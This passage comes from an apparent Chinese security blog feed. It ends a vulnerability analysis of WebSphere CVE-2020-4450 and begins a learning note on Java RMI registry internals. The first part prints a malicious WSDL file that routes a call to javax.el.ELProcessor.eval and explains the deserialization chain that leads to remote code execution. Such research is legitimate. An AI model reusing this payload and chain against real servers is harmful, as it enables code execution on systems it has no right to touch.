string">"RceServicePT"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>operation name<span class="token operator">=</span><span class="token string">"findByPrimaryKey"</span><span class="token operator">></span>            <span class="token operator">&lt;</span>input name<span class="token operator">=</span><span class="token string">"getExpressionRequest"</span> message<span class="token operator">=</span><span class="token string">"tns:findByPrimaryKeyRequse"</span><span class="token operator">/</span><span class="token operator">></span>            <span class="token operator">&lt;</span>output name<span class="token operator">=</span><span class="token string">"getExpressionResponse"</span> message<span class="token operator">=</span><span class="token string">"tns:findByPrimaryKeyReponse"</span><span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">/</span>operation<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>portType<span class="token operator">></span>    <span class="token operator">&lt;</span>binding name<span class="token operator">=</span><span class="token string">"JavaBinding"</span> type<span class="token operator">=</span><span class="token string">"tns:RceServicePT"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>java<span class="token operator">:</span>binding<span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span>format<span class="token operator">:</span>typeMapping encoding<span class="token operator">=</span><span class="token string">"Java"</span> style<span class="token operator">=</span><span class="token string">"Java"</span><span class="token operator">></span>            <span class="token operator">&lt;</span>format<span class="token operator">:</span>typeMap typeName<span class="token operator">=</span><span class="token string">"xsd:string"</span> formatType<span class="token operator">=</span><span class="token string">"java.lang.String"</span><span class="token operator">/</span><span class="token operator">></span>            <span class="token operator">&lt;</span>format<span class="token operator">:</span>typeMap typeName<span class="token operator">=</span><span class="token string">"xsd:object"</span> formatType<span class="token operator">=</span><span class="token string">"java.lang.Object"</span><span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">/</span>format<span class="token operator">:</span>typeMapping<span class="token operator">></span>        <span class="token operator">&lt;</span>operation name<span class="token operator">=</span><span class="token string">"findByPrimaryKey"</span><span class="token operator">></span>            <span class="token operator">&lt;</span>java<span class="token operator">:</span>operation                    methodName<span class="token operator">=</span><span class="token string">"eval"</span>                    parameterOrder<span class="token operator">=</span><span class="token string">"term"</span>                    methodType<span class="token operator">=</span><span class="token string">"instance"</span>                    returnPart<span class="token operator">=</span><span class="token string">"value"</span><span class="token operator">/</span><span class="token operator">></span>            <span class="token operator">&lt;</span>input name<span class="token operator">=</span><span class="token string">"getExpressionRequest"</span><span class="token operator">/</span><span class="token operator">></span>            <span class="token operator">&lt;</span>output name<span class="token operator">=</span><span class="token string">"getExpressionResponse"</span><span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">/</span>operation<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>binding<span class="token operator">></span>    <span class="token operator">&lt;</span>service name<span class="token operator">=</span><span class="token string">"rce_service"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>port name<span class="token operator">=</span><span class="token string">"JavaPort"</span> binding<span class="token operator">=</span><span class="token string">"tns:JavaBinding"</span><span class="token operator">></span>            <span class="token operator">&lt;</span>java<span class="token operator">:</span>address className<span class="token operator">=</span><span class="token string">"javax.el.ELProcessor"</span><span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">/</span>port<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>service<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>definitions<span class="token operator">></span></code></pre><p>可以看到Reference中的serviceName，portTypeName，preferredPort等字段的值都可以在这个xml中找到。</p><p>最终加载解析完成后会返回一个WSIFServiceImpl类型的值。getObjectInstance执行完成后会根据该WSIFServiceImpl对象生成一个对应的Proxy对象，也就前面提到的实现接口为CounterHome的那个proxy对象。</p><p>WSIFServiceObjectFactory的getObjectInstance方法执行完成后返回至EntityHandle的getEJBObject方法中，接下来会执行这里会查询homeClass中是否有个方法名叫findFindByPrimaryKey的方法，如果有的话返回该方法的Method对象，如果没有则返回空，该homeClass变量里的值是我们可控的，在IIOP客户端生成EntityHandle对象时就已经封装好了，其值为com.ibm.ws.batch.CounterHome所以执行结果时返回findFindByPrimaryKey方法的Method对像。</p><pre class=" language-java"><code class="language-java">Method fbpk <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">findFindByPrimaryKey</span><span class="token punctuation">(</span>homeClass<span class="token punctuation">)</span></code></pre><p>接下来就会执行最关键的一步也就是</p><pre class=" language-java"><code class="language-java"><span class="token keyword">this</span><span class="token punctuation">.</span>object <span class="token operator">=</span> <span class="token punctuation">(</span>EJBObject<span class="token punctuation">)</span>fbpk<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>home<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>key<span class="token punctuation">)</span></code></pre><p>![29](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/29.png)</p><p>接下来就会执行到WSIFClientProxy的Invoke方法中然后跟踪到WSIFOperation_Java的executeRequestResponseOperation方法中，该方法中有这么一行代码</p><pre class=" language-java"><code class="language-java">result <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>fieldMethods<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>objRef<span class="token punctuation">,</span> compatibleArguments<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>![30](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/30.png)</p><p>可以看到这里就通过放反射的方法调用javax.el.ELProcessor的eval方法了，并将我们我们想要执行的代码传递了进去。至此CVE-2020-445反序列化远程代码执行漏洞分析完毕。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>此次漏洞确实稍显复杂，但是思路其实还是挺清晰的，首先是通过构造发送的数据，让WebSphere先执行到反序列化的点，然后由于IBM JAVA SDK本身的限制，没办法使用RMI Reference或者LDAP Reference 远程加载Class到本地来执行恶意代码的方式了所以 需要从本地找到一个实现了ObjectFactory的类，并且该类在getObjectInstance方法中进行了有风险的操作，这里可以参考Michael Stepankin大佬的这篇文章<a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java。所以找到了WSIFServiceObjectFactory，该类解析了Reference并根据Reference中的值去加载和解析我们事先准备好的一个恶意WSDL文件。最终WebSphere根据WSIFServiceObjectFactory的getObjectInstance方法的返回值通过反射的方式调用了javax.el.ELProcessor的eval方法了最终执行了我们的恶意代码。" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-jndi-injections-java。所以找到了WSIFServiceObjectFactory，该类解析了Reference并根据Reference中的值去加载和解析我们事先准备好的一个恶意WSDL文件。最终WebSphere根据WSIFServiceObjectFactory的getObjectInstance方法的返回值通过反射的方式调用了javax.el.ELProcessor的eval方法了最终执行了我们的恶意代码。</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.thezdi.com/blog/2020/7/20/abusing-java-remote-protocols-in-ibm-websphere" target="_blank" rel="noopener">https://www.thezdi.com/blog/2020/7/20/abusing-java-remote-protocols-in-ibm-websphere</a></p><p><a href="https://mp.weixin.qq.com/s/spDHOaFh_0zxXAD4yPGejQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/spDHOaFh_0zxXAD4yPGejQ</a></p><p><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p><p><a href="https://ws.apache.org/wsif/providers/wsdl_extensions/java_extension.html" target="_blank" rel="noopener">https://ws.apache.org/wsif/providers/wsdl_extensions/java_extension.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> WebSphere </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人学习过程中对RMI JRMP 以及JNDI的一些理解</title>
      <link href="/2020/09/23/ge-ren-xue-xi-guo-cheng-zhong-dui-rmi-jrmp-yi-ji-jndi-de-yi-xie-li-jie/"/>
      <url>/2020/09/23/ge-ren-xue-xi-guo-cheng-zhong-dui-rmi-jrmp-yi-ji-jndi-de-yi-xie-li-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="个人学习过程中对RMI-JRMP-以及JNDI的一些理解"><a href="#个人学习过程中对RMI-JRMP-以及JNDI的一些理解" class="headerlink" title="个人学习过程中对RMI JRMP 以及JNDI的一些理解"></a>个人学习过程中对RMI JRMP 以及JNDI的一些理解</h1><h2 id="RPC框架原理简介"><a href="#RPC框架原理简介" class="headerlink" title="RPC框架原理简介"></a>RPC框架原理简介</h2><p>首先讲这些之前要明白一个概念，所有编程中的高级概念，看似很高级的一些功能什么的，都是建立于最基础的代码之上的，再高级也他离不开JDK。</p><p>例如此次涉及到的分布式的概念，就是通过java的socket，序列化，反序列化和反射来实现的。</p><p>举例说明 客户端要调用服务端的A对像的A方法，客户端会生成A对象的代理对象，代理对象里通过用Socket与服务端建立联系，然后将A方法以及调用A方法是要传入的参数序列化好通过socket传输给服务端，服务端接受反序列化接受到的数据，然后通过反射调用A对象的A方法并将参数传入，最终将执行结果返回给客户端，给人一种客户端在本地调用了服务端的A对象的A方法的错觉。 下面贴出马士兵老师讲课时的RMI代码</p><p>(没找到 回来重新敲一遍)</p><h2 id="RMI流程源码分析"><a href="#RMI流程源码分析" class="headerlink" title="RMI流程源码分析"></a>RMI流程源码分析</h2><p>到后来JAVA RMI这块也不例外 但是为了方便更灵活的调用发展成了以下的样子</p><p>在客户端(远程方法调用者)和服务端(远程方法提供者)之间又多了一个丙方也就所谓的Registry也就是注册中心。</p><p>启动这个注册中心的代码非常简单，如下所示</p><p>这个Registry是一个单独的程序 路径位于/Library/Java/JavaVirtualMachines/jdk1.8.0_221.jdk/Contents/Home/bin/rmiregistry</p><p>![image-20200721104006909](个人学习过程中对RMI JRMP 以及JNDI的一些理解/2.png)</p><p>刚刚所示的启动RMIRegistry的代码，也就是调用了这个rmiregistry可执行程序而已。</p><p>简单follow一下代码</p><pre class=" language-java"><code class="language-java"> <span class="token keyword">public</span> <span class="token keyword">static</span> Registry <span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token keyword">int</span> port<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">RegistryImpl</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"> <span class="token keyword">public</span> <span class="token function">RegistryImpl</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token keyword">int</span> var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>bindings <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var1 <span class="token operator">==</span> <span class="token number">1099</span> <span class="token operator">&amp;&amp;</span> System<span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            LiveRef var2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LiveRef</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setup</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">UnicastServerRef</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> RegistryImpl<span class="token operator">:</span><span class="token operator">:</span>registryFilter<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>很简单 没啥东西 liveRef里面就四个属性</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LiveRef</span> <span class="token keyword">implements</span> <span class="token class-name">Cloneable</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//指向一个TCPEndpoint对象，指定的Registry的ip地址和端口号</span>      <span class="token keyword">private</span> <span class="token keyword">final</span> Endpoint ep<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//一个目前不知道做什么用的id号</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> ObjID id<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//为null</span>    <span class="token keyword">private</span> <span class="token keyword">transient</span> Channel ch<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//为true</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> isLocal<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span></code></pre><p><code>this.setup(new UnicastServerRef(var2, RegistryImpl::registryFilter));</code>这段里面有个参数<code>RegistryImpl::registryFilter</code>这个东西就是jdk1.8.121版本以后添加的registryFilter专门用来校验传递进来的反序列化的类的，不在反序列化白名单内的类就不准进行反序列化操作，具体的方法代码如下</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> Status <span class="token function">registryFilter</span><span class="token punctuation">(</span>FilterInfo var0<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>registryFilter <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Status var1 <span class="token operator">=</span> registryFilter<span class="token punctuation">.</span><span class="token function">checkInput</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var1 <span class="token operator">!=</span> Status<span class="token punctuation">.</span>UNDECIDED<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> var1<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>var0<span class="token punctuation">.</span><span class="token function">depth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> 20L<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> Status<span class="token punctuation">.</span>REJECTED<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        Class <span class="token class-name">var2</span> <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">serialClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var2 <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var2<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">//可以很清楚的看到白名单的范围就下面这九个类型可以被反序列化</span>                <span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">!=</span> var2                   <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span>                   <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Remote<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span>                   <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Proxy<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span>                   <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>UnicastRef<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span>                   <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>RMIClientSocketFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span>                   <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>RMIServerSocketFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span>                   <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>ActivationID<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span>                   <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>UID<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">?</span> Status<span class="token punctuation">.</span>REJECTED <span class="token operator">:</span> Status<span class="token punctuation">.</span>ALLOWED<span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> var0<span class="token punctuation">.</span><span class="token function">arrayLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> 0L <span class="token operator">&amp;&amp;</span> var0<span class="token punctuation">.</span><span class="token function">arrayLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> 1000000L <span class="token operator">?</span> Status<span class="token punctuation">.</span>REJECTED <span class="token operator">:</span> Status<span class="token punctuation">.</span>UNDECIDED<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> Status<span class="token punctuation">.</span>UNDECIDED<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这个白名单先暂且放一放，后面用到了再说。执行完<code>new UnicastServerRef(var2, RegistryImpl::registryFilter)</code>后简单看一下UnicastServerRef对象里的内容</p><p>![image-20200720224807624](个人学习过程中对RMI JRMP 以及JNDI的一些理解/1.png)</p><p>setup方法内容</p><pre class=" language-java"><code class="language-java"> <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">setup</span><span class="token punctuation">(</span>UnicastServerRef var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>ref <span class="token operator">=</span> var1<span class="token punctuation">;</span>        var1<span class="token punctuation">.</span><span class="token function">exportObject</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>Object<span class="token punctuation">)</span>null<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p><code>UnicastServerRef.exportObject()</code> 方法内容</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Remote <span class="token function">exportObject</span><span class="token punctuation">(</span>Remote var1<span class="token punctuation">,</span> Object var2<span class="token punctuation">,</span> <span class="token keyword">boolean</span> var3<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//获取RegistryImpl的class对象</span>    Class <span class="token class-name">var4</span> <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Remote var5<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//Util.createProxy返回的值为RegistryImpl_Stub,这个stub在后面会进行讲解</span>        var5 <span class="token operator">=</span> Util<span class="token punctuation">.</span><span class="token function">createProxy</span><span class="token punctuation">(</span>var4<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClientRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>forceStubUse<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span> var7<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ExportException</span><span class="token punctuation">(</span><span class="token string">"remote object implements illegal remote interface"</span><span class="token punctuation">,</span> var7<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//RegistryImpl_Stub继承自RemoteStub判断成功</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>var5 <span class="token keyword">instanceof</span> <span class="token class-name">RemoteStub</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//为Skeleton赋值，通过this.skel = Util.createSkeleton(var1)来进行赋值，最终Util.createSkeleton(var1)返回的结果为一个RegistryImpl_Skel对象，这个Skeleton后面也会讲</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setSkeleton</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//实例化一个Target对象</span>    Target var6 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Target</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>ref<span class="token punctuation">.</span><span class="token function">getObjID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//做一个绑定这个target对象里有stub的相关信息</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>ref<span class="token punctuation">.</span><span class="token function">exportObject</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>hashToMethod_Map <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token punctuation">)</span>hashToMethod_Maps<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//最终LocateRegistry.createRegistry(1099)会返回一个RegistryImpl_Stub对象</span>      <span class="token comment" spellcheck="true">//同时启动rmiregistry,并监听指定端口</span>    <span class="token keyword">return</span> var5<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>很好这样启动rmiregistry的过程就简单分析完毕了，但是此时有一个问题，就是为什么会需要rmiregistry这么一个注册机制？客户端和服务端之间直接通过Socket互相调用不就好了么？就像马士兵老师的代码那样。很明显那个只是简单的讲解原理的用例，实际生产环境中肯定不会这么简单。</p><p>首先看下面这个RMI简单的流程图</p><p>![image-20200721105724075](个人学习过程中对RMI JRMP 以及JNDI的一些理解/3.png)</p><p>在考虑为什么需要这个rmiregistry之前，先考虑一个比较尴尬的问题。就是客户端(远程方法调用方)要想调用服务端(远程放方法服务方)的话，客户端要怎样才能知道服务端用来提供远程方法调用服务的ip地址和端口号？你说直接事先商量好然后写死在代码里面？可是服务方提供的端口号都是随机的啊，总不能我服务端每增加一个新的远程方法提供类就手动指定一个新的端口号吧？</p><p>所以现在就很尴尬，陷入了一个死循环，客户端想要调用服务端的方法客户端就需要先知道服务端的地址和对应的端口号，但是客户端又不知道因为没人告诉他。。。所以就相当的蛋疼。</p><p>此时就有了rmiregistry这么一个东西，我们先把rmiregistry称为丙方，功能很简单，服务端每新提供一个远程方法，都会来丙方(rmiregistry)这里注册一下，写明提供该方法远程条用服务的ip地址以及所对应的端口以及别的一些信息。</p><p>如下面的代码所示，首先我们如果要写一个提供远程方法调用服务的类，首先先写一个接口并继承Remote接口，</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">IHello</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//sayHello就是客户端要调用的方法，需要抛出RemoteException</span>    <span class="token keyword">public</span> String <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">throws</span> RemoteException<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>然后写一个类来实现这个接口</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>rmiTest<span class="token punctuation">.</span>IHelloImpl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>rmiTest<span class="token punctuation">.</span>IHello<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span>UnicastRemoteObject<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 该类可以选择继承UnicastRemoteObject，也可以通过下面注释中的这种形式，其实本质都一样都是调用了</span><span class="token comment" spellcheck="true">// exportObject()方法</span><span class="token comment" spellcheck="true">// Remote remote = UnicastRemoteObject.exportObject(new HelloImpl());</span><span class="token comment" spellcheck="true">// LocateRegistry.getRegistry("127.0.0.1",1099).bind("hello",remote);</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloImpl</span> <span class="token keyword">extends</span> <span class="token class-name">UnicastRemoteObject</span> <span class="token keyword">implements</span> <span class="token class-name">IHello</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">HelloImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>最后将这个HelloImpl类注册到也可以说是绑定到rmiregistry也就是丙方中</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>rmiTest<span class="token punctuation">.</span>provider<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>chouXiangTest<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>HelloServiceImpl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>rmiTest<span class="token punctuation">.</span>IHelloImpl<span class="token punctuation">.</span>HelloImpl<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>AlreadyBoundException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIProvider</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">,</span> AlreadyBoundException <span class="token punctuation">{</span>        LocateRegistry<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">HelloImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token 